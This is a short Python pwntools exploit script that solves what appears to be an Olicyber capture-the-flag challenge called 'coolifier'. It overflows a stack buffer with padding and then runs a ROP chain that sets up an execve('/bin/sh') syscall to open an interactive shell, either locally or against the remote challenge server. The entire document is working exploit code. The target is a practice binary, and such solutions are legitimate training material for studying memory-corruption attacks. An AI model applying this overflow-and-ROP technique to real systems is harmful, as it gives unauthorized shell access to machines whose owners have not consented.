from pwn import *

context.binary = elf = ELF('./coolifier')
context.terminal = ('kgx', '-e')

if args.REMOTE:
    r = remote('coolifier.challs.olicyber.it', 38068)
elif args.GDB:
    r = gdb.debug('./coolifier', gdbscript='b main\nc')

bear = bytes.fromhex('5C5FCA95E280A2E1B4A5E280A2CA945F2F')
print(len(bear), len('iamabear!')) # godo

payload = b'iamabear!'*15 + b'a' #256
payload += b'a'* 8 # rbp

payload += flat([
    0x4011a6, # pop rdi; add rdi, 8; ret
    elf.search(b'/bin/sh').__next__() - 8, # rdi = &"/bin/sh"
    0x4011bd, # pop rax; sub rax, 0x37; ret;
    0x3b + 0x37, # rax = 0x3b
    0x4011af, # pop rsi; ret
    0x0,
    0x4011c6, # syscall
])
if (len(payload) < 255):
    payload += b'\x00' * (255 - len(payload))  # padding to 255 bytes

r.sendlineafter(b'length: ', b'255')

r.sendlineafter(b'Message: ', payload)
r.interactive()
